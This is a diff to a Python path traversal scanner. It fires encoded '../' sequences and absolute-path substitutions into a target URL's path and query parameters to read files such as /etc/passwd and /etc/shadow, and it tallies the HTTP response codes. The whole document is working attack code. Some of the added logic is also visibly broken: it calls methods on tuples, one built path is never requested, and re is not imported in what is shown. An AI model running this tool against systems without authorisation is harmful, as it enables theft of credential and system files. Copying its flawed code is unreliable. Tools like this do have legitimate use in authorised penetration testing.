@@ -2,7 +2,8 @@ import requests
 import argparse
 
 traversal = ["../", "%2e%2e/", ".%2e/", "%2e./", "%252e%252e/", "%252e%252e\\", "..%c0%af", "..%c1%9c", "%2e%2e%c0%af", "%252e%252e%c1%9c", "%252e%252e%c0%af"]
-absolute_path = ["/var/www/html/get.php", "/var/www/html/admin/get.inc", "/etc/passwd", "/etc/shadow"]
+absolute_path = ["/var/www/html/index.html", "/var/www/html/get.php", "/var/www/html/admin/get.inc", "/etc/passwd", "/etc/shadow"]
+points = ["etc/passwd", "etc/shadow", "var/www/html/index.html"]
 response_codes = {}
 
 def get_args():
@@ -23,8 +24,19 @@ def print_status_codes():
     for code in response_codes:
         print("[{}] - {} times".format(code, response_codes[code]))
 
-def path_traversal(url, f, depth):
-    response_codes = {}
+def url_args(url):
+    args = re.findall('([a-zA-Z]*?)(=.*?)&', url)
+    return args
+
+def file_acces(path, f):
+    if isinstance(f, list):
+        for point in f:
+            access_test(path + point)
+    else:
+        access_test(path + f)
+
+def path_traversal(url, f, depth):    
+    uri_args = url_args(url)
     if url[-1] is '/':
         url = url[:-1]
     j = 0
@@ -34,9 +46,25 @@ def path_traversal(url, f, depth):
         else:
             path = url + t[-6:]
         for i in range(int(depth)):
-            path += t                
-            access_test(path + f)
+            path += t
+            file_acces(path, f)
         j += 1
+    if uri_args:
+        for ua in uri_args:
+            for ap in absolute_path:
+                apath = url.replace(ua.group(2), "=" + ap)
+                access_test(apath)
+            for t in traversal:
+                traverse = ""                
+                for i in range (int(depth)):
+                    traverse += t
+                    if isinstance(f, list):
+                        for point in f:
+                            npath = url.replace(ua.group(2), "=" + traverse + point)
+                            access_test(npath)
+                    else:
+                         npath = url.replace(ua.group(2), "=" + traverse + f)   
+                    
     print_status_codes()
 
 def access_test(path):
@@ -57,7 +85,7 @@ def main():
     args = get_args()
     try:
         depth = 12 if not args.depth else args.depth
-        f = "etc/passwd" if not args.f else args.f
+        f = points if not args.f else args.f
         if f[0] is '/':
             f = f[1:]
         path_traversal(args.target, f, depth)
